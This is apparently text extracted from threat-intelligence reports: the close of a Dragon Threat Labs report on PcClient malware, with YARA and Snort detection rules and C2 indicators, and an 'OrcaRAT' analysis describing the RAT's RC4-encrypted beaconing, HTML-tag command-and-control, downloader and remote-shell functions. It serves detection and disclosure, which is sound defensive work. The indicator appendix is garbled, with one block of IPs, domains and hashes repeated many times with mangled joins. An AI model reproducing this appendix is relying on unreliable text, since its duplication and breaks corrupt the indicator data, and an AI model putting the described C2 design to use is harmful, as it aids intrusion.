Hong Kong Page 12 In-memory version on PcClient rule apt_win_memory_pcclient { meta : author = `` @ dragonthreatlab `` md5 = `` ec532bbe9d0882d403473102e9724557 `` description = `` File matching the md5 above tends to only live in memory , hence the lack of MZ header check . '' strings : $ str1 = `` Kill You '' ascii $ str2 = `` % 4d- % 02d- % 02d % 02d : % 02d : % 02d '' ascii $ str3 = `` % 4.2f KB '' ascii $ encodefunc = { 8A 08 32 CA 02 CA 88 08 40 4E 75 F4 } condition : all of them } .
PcClient malware beaconing alert tcp $ HOME_NET any > $ EXTERNAL_NET [ 80,443 ] ( msg : '' MALWARE – DTL ID 12012015 PcClient beacon '' ; flow : established , to_server ; content : '' |BB 4E 4E BC BC BC 7E 7E| '' ; nocase ; offset:160 ; depth:8 ; classtype : trojan-activty ; sid : YOUR_SID ; rev:20122014 ; ) Malware domain alert udp $ HOME_NET any > $ EXTERNAL_NET 53 ( msg : '' MALWARE DTL ID 12012015 C2 Domain '' ; content : '' |06|aoemvp|03|com '' ; classtype : trojan-activity ; sid : YOUR_SID ; rev : 20122014 ; ) C2 server IP # 1 alert ip $ HOME_NET any < > 45.64.74.101 any ( msg : '' MALWARE DTL ID 12012015 – C2 IP Address '' ; classtype : trojan-activity ; sid : YOUR_SID ; rev : 20122014 ; ) C2 server IP # 2 alert ip $ HOME_NET any < > 103.229.127.104 any ( msg : '' MALWARE DTL ID 12012015 C2 IP Address `` ; classtype : trojan-activity ; sid : YOUR_SID ; rev : 20122014 ; ) .
Dragon Threat Labs , Hong Kong Page 13 .
Appendix .
The following artefacts were found during the investigation MD5s Network artefacts a6a18c846e5179259eba9de238f67e41 c.aoemvp.com 55f84d88d84c221437cd23cdbc541d2e aoemvp.com a6a18c846e5179259eba9de238f67e41 lim.kiu@hotmail.com 279ef79f904476ba0f9f44c87358bb1f 45.64.74.101 42b76c0503a6bf21f1ea86e0b14d67ea 103.229.127.104 cff25fe24a90ef63eaa168c07008c2bb ad17eff26994df824be36db246c8fb6a f66b64ef984ac46ac7395358059979bc efd9dc39682312d6576468f5c0eb6236 c.aoemvp.com ng artefacts were found during the investigation MD5s Network artefacts a6a18c846e5179259eba9de238f67e41 c.aoemvp.com 55f84d88d84c221437cd23cdbc541d2e aoemvp.com a6a18c846e5179259eba9de238f67e41 lim.kiu@hotmail.com 279ef79f904476ba0f9f44c87358bb1f 45.64.74.101 42b76c0503a6bf21f1ea86e0b14d67ea 103.229.127.104 cff25fe24a90ef63eaa168c07008c2bb ad17eff26994df824be36db246c8fb6a f66b64ef984ac46ac7395358059979bc efd9dc39682312d6576468f5c0eb6236 .
Dragon Threat Labs , Hong Kong Page 14 .
Contact .
For all questions relating to the publication or specifics in this document please contact us via one of the following methods : Twitter : @ dragonthreatlab Website : http : //dragonthreat.blogspot.hk Email : dragonthreatlabs @ gmail.com Kind regards , Dan Dragon Threat Labs .
Dragon Threat Labs , Hong Kong Page 15 .
OrcaRAT A whale of a tale .
By Dan Kelly and Tom Lancaster It ’ s every malware analyst ’ s dream to be handed a sample which is , so far , unnamed by the AV community especially when the malware in question may have links to a well-known APT group .
In my line of work I analyse several ‘ unknown ’ malware samples a week , but often it turns out that they are simply new variants of existing malware families .
Recently I was fortunate enough to be handed something that not only had a low detection rate but , aside from heuristics , seemed to be relatively unknown to the top 40 anti-virus companies .
In this post I will walk you through the malware family we ’ ve dubbed “ OrcaRAT ” .
First of all , it is worth pointing out that most of the malware I see on a day-to-day basis is espionage orientated , and very rarely do the programmers and operators make much effort to cover their tracks .
The use of forged HTTP headers is a common occurrence and simple mistakes within these headers are frequent .
The malware in question was handed to me by one of our threat intelligence analysts who was hunting through infrastructure associated with some samples of Comfoo [ 1 ] malware and happened across a malware sample ( 253a704acd7952677c70e0c2d787791b8359efe2c92a5e77acea028393a85613 ) he didn ’ t recognise .
He immediately took the malware and passed it through first stage analysis , which involves running the file in a sandbox environment .
After this , he handed it over for more in-depth capability analysis .
The structure I began by looking over the sandbox report .
The first thing that drew my attention was the URI structure .
( A screenshot showing the HTTP headers and URI structure that OrcaRAT produces ) To those of us who are familiar with decoding data , you will notice that the URI string formatting appears to be a modified version of the Base64 algorithm .
To understand this structure more , we must reverse engineer the functions that generate and then encode the data .
Firstly we begin by analysing the routines that produce the data which is later encoded and sent in the HTTP URI field .
The very first thing that jumped out when disassembling the malware is the simplicity and cleanliness of the code .
There are also a significant number of Windows Crypto API [ 2 ] functions imported by the malware , so we can assume this indicates that it uses encryption .
( A screenshot showing the functions that are imported by OrcaRAT ) Delving deeper in to the disassembly , we come across the preamble to the URI generation function :
( A screenshot showing the decoding and generation of a string value ) The function above uses Windows crypto API to generate a random number of 6 bytes , then dynamically builds and appends the word “ OrcaKiller ” on to the end of this number .
In one such example the final product was `` \x61\xBA\xF4\x44\x52\xF1OrcaKiller '' ( where \x denotes hexadecimal values ) .
Once this value has been produced , the malware begins constructing the URI .
With many pieces of malware the initial communications that it sends out to its command and control server ( known as beaconing or phoning home ) usually include pieces of information about the victim system .
OrcaRAT is no exception .
The randomly generated values noted above are actually used to encrypt several pieces of information that are extracted from the system , and even the key itself is included .
( A screenshot showing an encryption function used by OrcaRAT ) All of the values extracted from the system are encrypted using the RC4 [ 3 ] algorithm and then base64 encoded .
The RC4 encryption key is derived from an MD5 hash [ 4 ] of the randomly generated bytes concatenated with the ‘ OrcaKiller ’ string .
Once the data has been encrypted it is base64 encoded .
Any forward slashes in the base64 string are replaced with a tilde pseudo code is shown below .
Once all of the values have been encrypted and formatted the URI has the following structure :
( A screenshot showing the URI structure of OrcaRAT command and control activity ) The campaign ID value is constructed using a method similar to that for the encryption key .
( A screenshot showing the generation of the first hidden string value ) It would appear that the authors did not want anybody to be able to easily see this value .
This now gives us OrcaKiller and wHaLe .
It would appear that our adversary has a salty sense of humour .
Command and control As with all malware , the command and control functions reveal the true nature and intent of the operators .
Up until now we have only determined how the malware communicates with the server .
We will now investigate the mechanisms that the server uses to communicate and interact with the victim .
The command and control routine in OrcaRAT appears to serve two purposes .
Interestingly these routines are split in to two branches .
Each branch of command and control activity is determined by the unique response from the remote server .
Command and control takes form of a webpage .
Unlike malware designed by the well-known Comment Crew [ 5 ] , this group does not hide these commands in HTML comments , but instead places them in plain view .
The first set of commands force the malware to behave as a simple downloader .
( A screenshot showing OrcaRAT parsing the HTML code behind a webpage ) Upon downloading the webpage from the server the malware looks for specific sets of HTML tags .
The first set are .
and the terminating tag .
Once the malware has found these tags it drops in to the first command and control function .
The malware then extracts the payload text between the HTML tags and runs it through a decryption routine .
The same encryption key that is sent in the URI string is used to decrypt the text .
Once the payload text has been decrypted the malware treats this as a binary executable file , which is then written to the disk and executed .
The second set of HTML tags allows the operator to drop the malware in to a set of remote control functions .
This time the malware searches for the < H1 > tag that is terminated by < /H1 > .
Once the payload text between these tags has been extracted it is then decrypted using the encryption key found in the URI string .
The payload text from this page is much smaller and ultimately points to the command function that the operator has executed .
( A screenshot showing the structure of the command and control routines within OrcaRAT ) The command and control structure is fairly simplistic but provides the operator with access to the victim machine ’ s filesystem and command line , and as such allows the attacker to perform various tasks such as executing arbitrary commands or uploading and downloading files from the compromised system .
After a command and control message is received , OrcaRAT sends an HTTP POST message back to the command and control server .
Each time that the URI is built it generates a new encryption key , showing that the command and control server is at least serving dynamic content .
Given the command structure above , it is logical to assume that the command and control server requires an operator to manually issue specific commands to the victim workstation , with the default command likely being ‘ sleep ’ .
Given the information above we can reasonably assume that this malware was most likely designed as a first stage implant .
History has shown that malware designed in this way is usually done so to allow the operator an initial level of access to the compromised system , usually for surveying the victim and then deciding whether to deploy a more capable and valuable second stage malware implant .
Detection Once OrcaRAT has been delivered to a victim system there are a number of ways to detect it .
Firstly we will cover disk detection using Yara .
The rule below will detect an OrcaRAT binary executable that has been written to a compromised machine ’ s disk .
OrcaRAT can also be detected in two separate ways at the network level using a Snort or Suricata IDS rule .
Detecting malware at different stages of connectivity can be important .
By creating signatures with a nexus to the kill chain [ 6 ] we can determine which stage the intrusion has reached .
The two signatures below will indicate whether the intrusion has reached the command and control or action-on phases .
Appendix A : Samples of Orca RAT :
Hash C2 07b40312047f204a2c1fbd94fba6f53b adda.lengendport.com f6456b115e325b612e0d144c8090720f tsl.gettrials.com 139b8e1b665bb9237ec51ec4bef22f58 auty.organiccrap.com .
Appendix B : Related indicators .
Indicator Type 11.38.64.251 IP Address 123.120.115.77 IP Address 123.120.99.228 IP Address 142.0.134.20 IP Address 147.96.68.184 IP Address 176.31.24.182 IP Address 176.31.24.184 IP Address 190.114.241.170 IP Address 200.78.201.24 IP Address 202.124.151.94 IP Address 202.2.108.142 IP Address 203.146.251.11 IP Address 204.152.209.74 IP Address 213.147.54.170 IP Address 23.19.39.19 IP Address 58.71.158.21 IP Address 62.73.174.134 IP Address 71.183.67.163 IP Address 74.116.128.15 IP Address 81.218.149.207 IP Address 84c68f2d2dd569c4620dabcecd477e69 Hash 8fbc8c7d62a41b6513603c4051a3ee7b Hash 91.198.50.31 IP Address adda . lengendport.com Domain affisensors.com Domain analysis.ittecbbs.com Domain at.acmetoy.com Domain aucy.affisensors.com Domain auty.organiccrap.com Domain bbs.dynssl.com Domain bbs.serveuser.com Domain bbslab.acmetoy.com Domain bbslab.lflink.com Domain cdna.acmetoy.com Domain cune.lengendport.com Domain cure.yourtrap.com Domain dasheng.lonidc.com Domain dns.affisensors.com Domain edu.authorizeddns.org Domain edu.onmypc.org Domain fee0e6b8157099ad09380a94b7cbbea4 Hash ftp.bbs.dynssl.com Domain ftp.bbs.serveuser.com Domain ftp.bbslab.acmetoy.com Domain ftp.edu.authorizeddns.org Domain ftp.edu.onmypc.org Domain ftp . lucy.justdied.com Domain ftp.nuac.jkub.com Domain ftp . osk.lflink.com Domain ftp . reg.dsmtp.com Domain ftp . tt0320.portrelay.com Domain home.affisensors.com Domain hot.mrface.com Domain info.affisensors.com Domain jucy.wikaba.com Domain jutty.organiccrap.com Domain lengendport.com Domain lucy.justdied.com Domain newtect.ddns.us Domain nuac.jkub.com Domain nunok.ninth.biz Domain osk.lflink.com Domain philipine.gnway.net Domain pure.mypop3.org Domain reg.dsmtp.com Domain tt0320.portrelay.com Domain venus.gr8domain.biz Domain www.bbs.dynssl.com Domain www.bbs.serveuser.com Domain www.bbslab.acmetoy.com Domain www.edu.authorizeddns.org Domain www.edu.onmypc.org Domain www.fgtr.info Domain www.hot.mrface.com Domain www.ktry.info Domain www.lucy.justdied.com Domain www.osk.lflink.com Domain www.reg.dsmtp.com Domain www.tt0320.portrelay.com Domain ftp.lucy.justdied.com Type 11.38.64.251 IP Address 123.120.115.77 IP Address 123.120.99.228 IP Address 142.0.134.20 IP Address 147.96.68.184 IP Address 176.31.24.182 IP Address 176.31.24.184 IP Address 190.114.241.170 IP Address 200.78.201.24 IP Address 202.124.151.94 IP Address 202.2.108.142 IP Address 203.146.251.11 IP Address 204.152.209.74 IP Address 213.147.54.170 IP Address 23.19.39.19 IP Address 58.71.158.21 IP Address 62.73.174.134 IP Address 71.183.67.163 IP Address 74.116.128.15 IP Address 81.218.149.207 IP Address 84c68f2d2dd569c4620dabcecd477e69 Hash 8fbc8c7d62a41b6513603c4051a3ee7b Hash 91.198.50.31 IP Address adda.lengendport.com Domain affisensors.com Domain analysis.ittecbbs.com Domain at.acmetoy.com Domain aucy.affisensors.com Domain auty.organiccrap.com Domain bbs.dynssl.com Domain bbs.serveuser.com Domain bbslab.acmetoy.com Domain bbslab.lflink.com Domain cdna.acmetoy.com Domain cune.lengendport.com Domain cure.yourtrap.com Domain dasheng.lonidc.com Domain dns.affisensors.com Domain edu.authorizeddns.org Domain edu.onmypc.org Domain fee0e6b8157099ad09380a94b7cbbea4 Hash ftp.bbs.dynssl.com Domain ftp.bbs.serveuser.com Domain ftp.bbslab.acmetoy.com Domain ftp.edu.authorizeddns.org Domain ftp.edu.onmypc.org Domain ftp.lucy.justdied.com Domain ftp.nuac.jkub.com Domain ftp.osk.lflink.com Domain ftp.reg.dsmtp.com Domain ftp.tt0320.portrelay.com Domain home.affisensors.com Domain hot.mrface.com Domain info.affisensors.com Domain jucy.wikaba.com Domain jutty.organiccrap.com Domain lengendport.com Domain lucy.justdied.com Domain newtect.ddns.us Domain nuac.jkub.com Domain nunok.ninth.biz Domain osk.lflink.com Domain philipine.gnway.net Domain pure.mypop3.org Domain reg.dsmtp.com Domain tt0320.portrelay.com Domain venus.gr8domain.biz Domain www.bbs.dynssl.com Domain www.bbs.serveuser.com Domain www.bbslab.acmetoy.com Domain www.edu.authorizeddns.org Domain www.edu.onmypc.org Domain www.fgtr.info Domain www.hot.mrface.com Domain www.ktry.info Domain www.lucy.justdied.com Domain www.osk.lflink.com Domain www.reg.dsmtp.com Domain www.tt0320.portrelay.com Domain ftp.osk.lflink.com Type 11.38.64.251 IP Address 123.120.115.77 IP Address 123.120.99.228 IP Address 142.0.134.20 IP Address 147.96.68.184 IP Address 176.31.24.182 IP Address 176.31.24.184 IP Address 190.114.241.170 IP Address 200.78.201.24 IP Address 202.124.151.94 IP Address 202.2.108.142 IP Address 203.146.251.11 IP Address 204.152.209.74 IP Address 213.147.54.170 IP Address 23.19.39.19 IP Address 58.71.158.21 IP Address 62.73.174.134 IP Address 71.183.67.163 IP Address 74.116.128.15 IP Address 81.218.149.207 IP Address 84c68f2d2dd569c4620dabcecd477e69 Hash 8fbc8c7d62a41b6513603c4051a3ee7b Hash 91.198.50.31 IP Address adda.lengendport.com Domain affisensors.com Domain analysis.ittecbbs.com Domain at.acmetoy.com Domain aucy.affisensors.com Domain auty.organiccrap.com Domain bbs.dynssl.com Domain bbs.serveuser.com Domain bbslab.acmetoy.com Domain bbslab.lflink.com Domain cdna.acmetoy.com Domain cune.lengendport.com Domain cure.yourtrap.com Domain dasheng.lonidc.com Domain dns.affisensors.com Domain edu.authorizeddns.org Domain edu.onmypc.org Domain fee0e6b8157099ad09380a94b7cbbea4 Hash ftp.bbs.dynssl.com Domain ftp.bbs.serveuser.com Domain ftp.bbslab.acmetoy.com Domain ftp.edu.authorizeddns.org Domain ftp.edu.onmypc.org Domain ftp.lucy.justdied.com Domain ftp.nuac.jkub.com Domain ftp.osk.lflink.com Domain ftp.reg.dsmtp.com Domain ftp.tt0320.portrelay.com Domain home.affisensors.com Domain hot.mrface.com Domain info.affisensors.com Domain jucy.wikaba.com Domain jutty.organiccrap.com Domain lengendport.com Domain lucy.justdied.com Domain newtect.ddns.us Domain nuac.jkub.com Domain nunok.ninth.biz Domain osk.lflink.com Domain philipine.gnway.net Domain pure.mypop3.org Domain reg.dsmtp.com Domain tt0320.portrelay.com Domain venus.gr8domain.biz Domain www.bbs.dynssl.com Domain www.bbs.serveuser.com Domain www.bbslab.acmetoy.com Domain www.edu.authorizeddns.org Domain www.edu.onmypc.org Domain www.fgtr.info Domain www.hot.mrface.com Domain www.ktry.info Domain www.lucy.justdied.com Domain www.osk.lflink.com Domain www.reg.dsmtp.com Domain www.tt0320.portrelay.com Domainftp.lucy.justdied.com Type 11.38.64.251 IP Address 123.120.115.77 IP Address 123.120.99.228 IP Address 142.0.134.20 IP Address 147.96.68.184 IP Address 176.31.24.182 IP Address 176.31.24.184 IP Address 190.114.241.170 IP Address 200.78.201.24 IP Address 202.124.151.94 IP Address 202.2.108.142 IP Address 203.146.251.11 IP Address 204.152.209.74 IP Address 213.147.54.170 IP Address 23.19.39.19 IP Address 58.71.158.21 IP Address 62.73.174.134 IP Address 71.183.67.163 IP Address 74.116.128.15 IP Address 81.218.149.207 IP Address 84c68f2d2dd569c4620dabcecd477e69 Hash 8fbc8c7d62a41b6513603c4051a3ee7b Hash 91.198.50.31 IP Address adda.lengendport.com Domain affisensors.com Domain analysis.ittecbbs.com Domain at.acmetoy.com Domain aucy.affisensors.com Domain auty.organiccrap.com Domain bbs.dynssl.com Domain bbs.serveuser.com Domain bbslab.acmetoy.com Domain bbslab.lflink.com Domain cdna.acmetoy.com Domain cune.lengendport.com Domain cure.yourtrap.com Domain dasheng.lonidc.com Domain dns.affisensors.com Domain edu.authorizeddns.org Domain edu.onmypc.org Domain fee0e6b8157099ad09380a94b7cbbea4 Hash ftp.bbs.dynssl.com Domain ftp.bbs.serveuser.com Domain ftp.bbslab.acmetoy.com Domain ftp.edu.authorizeddns.org Domain ftp.edu.onmypc.org Domain ftp.lucy.justdied.com Domain ftp.nuac.jkub.com Domain ftp.osk.lflink.com Domain ftp.reg.dsmtp.com Domain ftp.tt0320.portrelay.com Domain home.affisensors.com Domain hot.mrface.com Domain info.affisensors.com Domain jucy.wikaba.com Domain jutty.organiccrap.com Domain lengendport.com Domain lucy.justdied.com Domain newtect.ddns.us Domain nuac.jkub.com Domain nunok.ninth.biz Domain osk.lflink.com Domain philipine.gnway.net Domain pure.mypop3.org Domain reg.dsmtp.com Domain tt0320.portrelay.com Domain venus.gr8domain.biz Domain www.bbs.dynssl.com Domain www.bbs.serveuser.com Domain www.bbslab.acmetoy.com Domain www.edu.authorizeddns.org Domain www.edu.onmypc.org Domain www.fgtr.info Domain www.hot.mrface.com Domain www.ktry.info Domain www.lucy.justdied.com Domain www.osk.lflink.com Domain www.reg.dsmtp.com Domain www.tt0320.portrelay.com Domain ftp.reg.dsmtp.com Type 11.38.64.251 IP Address 123.120.115.77 IP Address 123.120.99.228 IP Address 142.0.134.20 IP Address 147.96.68.184 IP Address 176.31.24.182 IP Address 176.31.24.184 IP Address 190.114.241.170 IP Address 200.78.201.24 IP Address 202.124.151.94 IP Address 202.2.108.142 IP Address 203.146.251.11 IP Address 204.152.209.74 IP Address 213.147.54.170 IP Address 23.19.39.19 IP Address 58.71.158.21 IP Address 62.73.174.134 IP Address 71.183.67.163 IP Address 74.116.128.15 IP Address 81.218.149.207 IP Address 84c68f2d2dd569c4620dabcecd477e69 Hash 8fbc8c7d62a41b6513603c4051a3ee7b Hash 91.198.50.31 IP Address adda.lengendport.com Domain affisensors.com Domain analysis.ittecbbs.com Domain at.acmetoy.com Domain aucy.affisensors.com Domain auty.organiccrap.com Domain bbs.dynssl.com Domain bbs.serveuser.com Domain bbslab.acmetoy.com Domain bbslab.lflink.com Domain cdna.acmetoy.com Domain cune.lengendport.com Domain cure.yourtrap.com Domain dasheng.lonidc.com Domain dns.affisensors.com Domain edu.authorizeddns.org Domain edu.onmypc.org Domain fee0e6b8157099ad09380a94b7cbbea4 Hash ftp.bbs.dynssl.com Domain ftp.bbs.serveuser.com Domain ftp.bbslab.acmetoy.com Domain ftp.edu.authorizeddns.org Domain ftp.edu.onmypc.org Domain ftp.lucy.justdied.com Domain ftp.nuac.jkub.com Domain ftp.osk.lflink.com Domain ftp.reg.dsmtp.com Domain ftp.tt0320.portrelay.com Domain home.affisensors.com Domain hot.mrface.com Domain info.affisensors.com Domain jucy.wikaba.com Domain jutty.organiccrap.com Domain lengendport.com Domain lucy.justdied.com Domain newtect.ddns.us Domain nuac.jkub.com Domain nunok.ninth.biz Domain osk.lflink.com Domain philipine.gnway.net Domain pure.mypop3.org Domain reg.dsmtp.com Domain tt0320.portrelay.com Domain venus.gr8domain.biz Domain www.bbs.dynssl.com Domain www.bbs.serveuser.com Domain www.bbslab.acmetoy.com Domain www.edu.authorizeddns.org Domain www.edu.onmypc.org Domain www.fgtr.info Domain www.hot.mrface.com Domain www.ktry.info Domain www.lucy.justdied.com Domain www.osk.lflink.com Domain www.reg.dsmtp.com Domain www.tt0320.portrelay.com Domainftp.lucy.justdied.com Type 11.38.64.251 IP Address 123.120.115.77 IP Address 123.120.99.228 IP Address 142.0.134.20 IP Address 147.96.68.184 IP Address 176.31.24.182 IP Address 176.31.24.184 IP Address 190.114.241.170 IP Address 200.78.201.24 IP Address 202.124.151.94 IP Address 202.2.108.142 IP Address 203.146.251.11 IP Address 204.152.209.74 IP Address 213.147.54.170 IP Address 23.19.39.19 IP Address 58.71.158.21 IP Address 62.73.174.134 IP Address 71.183.67.163 IP Address 74.116.128.15 IP Address 81.218.149.207 IP Address 84c68f2d2dd569c4620dabcecd477e69 Hash 8fbc8c7d62a41b6513603c4051a3ee7b Hash 91.198.50.31 IP Address adda.lengendport.com Domain affisensors.com Domain analysis.ittecbbs.com Domain at.acmetoy.com Domain aucy.affisensors.com Domain auty.organiccrap.com Domain bbs.dynssl.com Domain bbs.serveuser.com Domain bbslab.acmetoy.com Domain bbslab.lflink.com Domain cdna.acmetoy.com Domain cune.lengendport.com Domain cure.yourtrap.com Domain dasheng.lonidc.com Domain dns.affisensors.com Domain edu.authorizeddns.org Domain edu.onmypc.org Domain fee0e6b8157099ad09380a94b7cbbea4 Hash ftp.bbs.dynssl.com Domain ftp.bbs.serveuser.com Domain ftp.bbslab.acmetoy.com Domain ftp.edu.authorizeddns.org Domain ftp.edu.onmypc.org Domain ftp.lucy.justdied.com Domain ftp.nuac.jkub.com Domain ftp.osk.lflink.com Domain ftp.reg.dsmtp.com Domain ftp.tt0320.portrelay.com Domain home.affisensors.com Domain hot.mrface.com Domain info.affisensors.com Domain jucy.wikaba.com Domain jutty.organiccrap.com Domain lengendport.com Domain lucy.justdied.com Domain newtect.ddns.us Domain nuac.jkub.com Domain nunok.ninth.biz Domain osk.lflink.com Domain philipine.gnway.net Domain pure.mypop3.org Domain reg.dsmtp.com Domain tt0320.portrelay.com Domain venus.gr8domain.biz Domain www.bbs.dynssl.com Domain www.bbs.serveuser.com Domain www.bbslab.acmetoy.com Domain www.edu.authorizeddns.org Domain www.edu.onmypc.org Domain www.fgtr.info Domain www.hot.mrface.com Domain www.ktry.info Domain www.lucy.justdied.com Domain www.osk.lflink.com Domain www.reg.dsmtp.com Domain www.tt0320.portrelay.com Domainftp.osk.lflink.com Type 11.38.64.251 IP Address 123.120.115.77 IP Address 123.120.99.228 IP Address 142.0.134.20 IP Address 147.96.68.184 IP Address 176.31.24.182 IP Address 176.31.24.184 IP Address 190.114.241.170 IP Address 200.78.201.24 IP Address 202.124.151.94 IP Address 202.2.108.142 IP Address 203.146.251.11 IP Address 204.152.209.74 IP Address 213.147.54.170 IP Address 23.19.39.19 IP Address 58.71.158.21 IP Address 62.73.174.134 IP Address 71.183.67.163 IP Address 74.116.128.15 IP Address 81.218.149.207 IP Address 84c68f2d2dd569c4620dabcecd477e69 Hash 8fbc8c7d62a41b6513603c4051a3ee7b Hash 91.198.50.31 IP Address adda.lengendport.com Domain affisensors.com Domain analysis.ittecbbs.com Domain at.acmetoy.com Domain aucy.affisensors.com Domain auty.organiccrap.com Domain bbs.dynssl.com Domain bbs.serveuser.com Domain bbslab.acmetoy.com Domain bbslab.lflink.com Domain cdna.acmetoy.com Domain cune.lengendport.com Domain cure.yourtrap.com Domain dasheng.lonidc.com Domain dns.affisensors.com Domain edu.authorizeddns.org Domain edu.onmypc.org Domain fee0e6b8157099ad09380a94b7cbbea4 Hash ftp.bbs.dynssl.com Domain ftp.bbs.serveuser.com Domain ftp.bbslab.acmetoy.com Domain ftp.edu.authorizeddns.org Domain ftp.edu.onmypc.org Domain ftp.lucy.justdied.com Domain ftp.nuac.jkub.com Domain ftp.osk.lflink.com Domain ftp.reg.dsmtp.com Domain ftp.tt0320.portrelay.com Domain home.affisensors.com Domain hot.mrface.com Domain info.affisensors.com Domain jucy.wikaba.com Domain jutty.organiccrap.com Domain lengendport.com Domain lucy.justdied.com Domain newtect.ddns.us Domain nuac.jkub.com Domain nunok.ninth.biz Domain osk.lflink.com Domain philipine.gnway.net Domain pure.mypop3.org Domain reg.dsmtp.com Domain tt0320.portrelay.com Domain venus.gr8domain.biz Domain www.bbs.dynssl.com Domain www.bbs.serveuser.com Domain www.bbslab.acmetoy.com Domain www.edu.authorizeddns.org Domain www.edu.onmypc.org Domain www.fgtr.info Domain www.hot.mrface.com Domain www.ktry.info Domain www.lucy.justdied.com Domain www.osk.lflink.com Domain www.reg.dsmtp.com Domain www.tt0320.portrelay.com Domainftp.lucy.justdied.com Type 11.38.64.251 IP Address 123.120.115.77 IP Address 123.120.99.228 IP Address 142.0.134.20 IP Address 147.96.68.184 IP Address 176.31.24.182 IP Address 176.31.24.184 IP Address 190.114.241.170 IP Address 200.78.201.24 IP Address 202.124.151.94 IP Address 202.2.108.142 IP Address 203.146.251.11 IP Address 204.152.209.74 IP Address 213.147.54.170 IP Address 23.19.39.19 IP Address 58.71.158.21 IP Address 62.73.174.134 IP Address 71.183.67.163 IP Address 74.116.128.15 IP Address 81.218.149.207 IP Address 84c68f2d2dd569c4620dabcecd477e69 Hash 8fbc8c7d62a41b6513603c4051a3ee7b Hash 91.198.50.31 IP Address adda.lengendport.com Domain affisensors.com Domain analysis.ittecbbs.com Domain at.acmetoy.com Domain aucy.affisensors.com Domain auty.organiccrap.com Domain bbs.dynssl.com Domain bbs.serveuser.com Domain bbslab.acmetoy.com Domain bbslab.lflink.com Domain cdna.acmetoy.com Domain cune.lengendport.com Domain cure.yourtrap.com Domain dasheng.lonidc.com Domain dns.affisensors.com Domain edu.authorizeddns.org Domain edu.onmypc.org Domain fee0e6b8157099ad09380a94b7cbbea4 Hash ftp.bbs.dynssl.com Domain ftp.bbs.serveuser.com Domain ftp.bbslab.acmetoy.com Domain ftp.edu.authorizeddns.org Domain ftp.edu.onmypc.org Domain ftp.lucy.justdied.com Domain ftp.nuac.jkub.com Domain ftp.osk.lflink.com Domain ftp.reg.dsmtp.com Domain ftp.tt0320.portrelay.com Domain home.affisensors.com Domain hot.mrface.com Domain info.affisensors.com Domain jucy.wikaba.com Domain jutty.organiccrap.com Domain lengendport.com Domain lucy.justdied.com Domain newtect.ddns.us Domain nuac.jkub.com Domain nunok.ninth.biz Domain osk.lflink.com Domain philipine.gnway.net Domain pure.mypop3.org Domain reg.dsmtp.com Domain tt0320.portrelay.com Domain venus.gr8domain.biz Domain www.bbs.dynssl.com Domain www.bbs.serveuser.com Domain www.bbslab.acmetoy.com Domain www.edu.authorizeddns.org Domain www.edu.onmypc.org Domain www.fgtr.info Domain www.hot.mrface.com Domain www.ktry.info Domain www.lucy.justdied.com Domain www.osk.lflink.com Domain www.reg.dsmtp.com Domain www.tt0320.portrelay.com Domain ftp.tt0320.portrelay.com Type 11.38.64.251 IP Address 123.120.115.77 IP Address 123.120.99.228 IP Address 142.0.134.20 IP Address 147.96.68.184 IP Address 176.31.24.182 IP Address 176.31.24.184 IP Address 190.114.241.170 IP Address 200.78.201.24 IP Address 202.124.151.94 IP Address 202.2.108.142 IP Address 203.146.251.11 IP Address 204.152.209.74 IP Address 213.147.54.170 IP Address 23.19.39.19 IP Address 58.71.158.21 IP Address 62.73.174.134 IP Address 71.183.67.163 IP Address 74.116.128.15 IP Address 81.218.149.207 IP Address 84c68f2d2dd569c4620dabcecd477e69 Hash 8fbc8c7d62a41b6513603c4051a3ee7b Hash 91.198.50.31 IP Address adda.lengendport.com Domain affisensors.com Domain analysis.ittecbbs.com Domain at.acmetoy.com Domain aucy.affisensors.com Domain auty.organiccrap.com Domain bbs.dynssl.com Domain bbs.serveuser.com Domain bbslab.acmetoy.com Domain bbslab.lflink.com Domain cdna.acmetoy.com Domain cune.lengendport.com Domain cure.yourtrap.com Domain dasheng.lonidc.com Domain dns.affisensors.com Domain edu.authorizeddns.org Domain edu.onmypc.org Domain fee0e6b8157099ad09380a94b7cbbea4 Hash ftp.bbs.dynssl.com Domain ftp.bbs.serveuser.com Domain ftp.bbslab.acmetoy.com Domain ftp.edu.authorizeddns.org Domain ftp.edu.onmypc.org Domain ftp.lucy.justdied.com Domain ftp.nuac.jkub.com Domain ftp.osk.lflink.com Domain ftp.reg.dsmtp.com Domain ftp.tt0320.portrelay.com Domain home.affisensors.com Domain hot.mrface.com Domain info.affisensors.com Domain jucy.wikaba.com Domain jutty.organiccrap.com Domain lengendport.com Domain lucy.justdied.com Domain newtect.ddns.us Domain nuac.jkub.com Domain nunok.ninth.biz Domain osk.lflink.com Domain philipine.gnway.net Domain pure.mypop3.org Domain reg.dsmtp.com Domain tt0320.portrelay.com Domain venus.gr8domain.biz Domain www.bbs.dynssl.com Domain www.bbs.serveuser.com Domain www.bbslab.acmetoy.com Domain www.edu.authorizeddns.org Domain www.edu.onmypc.org Domain www.fgtr.info Domain www.hot.mrface.com Domain www.ktry.info Domain www.lucy.justdied.com Domain www.osk.lflink.com Domain www.reg.dsmtp.com Domain www.tt0320.portrelay.com Domainftp.lucy.justdied.com Type 11.38.64.251 IP Address 123.120.115.77 IP Address 123.120.99.228 IP Address 142.0.134.20 IP Address 147.96.68.184 IP Address 176.31.24.182 IP Address 176.31.24.184 IP Address 190.114.241.170 IP Address 200.78.201.24 IP Address 202.124.151.94 IP Address 202.2.108.142 IP Address 203.146.251.11 IP Address 204.152.209.74 IP Address 213.147.54.170 IP Address 23.19.39.19 IP Address 58.71.158.21 IP Address 62.73.174.134 IP Address 71.183.67.163 IP Address 74.116.128.15 IP Address 81.218.149.207 IP Address 84c68f2d2dd569c4620dabcecd477e69 Hash 8fbc8c7d62a41b6513603c4051a3ee7b Hash 91.198.50.31 IP Address adda.lengendport.com Domain affisensors.com Domain analysis.ittecbbs.com Domain at.acmetoy.com Domain aucy.affisensors.com Domain auty.organiccrap.com Domain bbs.dynssl.com Domain bbs.serveuser.com Domain bbslab.acmetoy.com Domain bbslab.lflink.com Domain cdna.acmetoy.com Domain cune.lengendport.com Domain cure.yourtrap.com Domain dasheng.lonidc.com Domain dns.affisensors.com Domain edu.authorizeddns.org Domain edu.onmypc.org Domain fee0e6b8157099ad09380a94b7cbbea4 Hash ftp.bbs.dynssl.com Domain ftp.bbs.serveuser.com Domain ftp.bbslab.acmetoy.com Domain ftp.edu.authorizeddns.org Domain ftp.edu.onmypc.org Domain ftp.lucy.justdied.com Domain ftp.nuac.jkub.com Domain ftp.osk.lflink.com Domain ftp.reg.dsmtp.com Domain 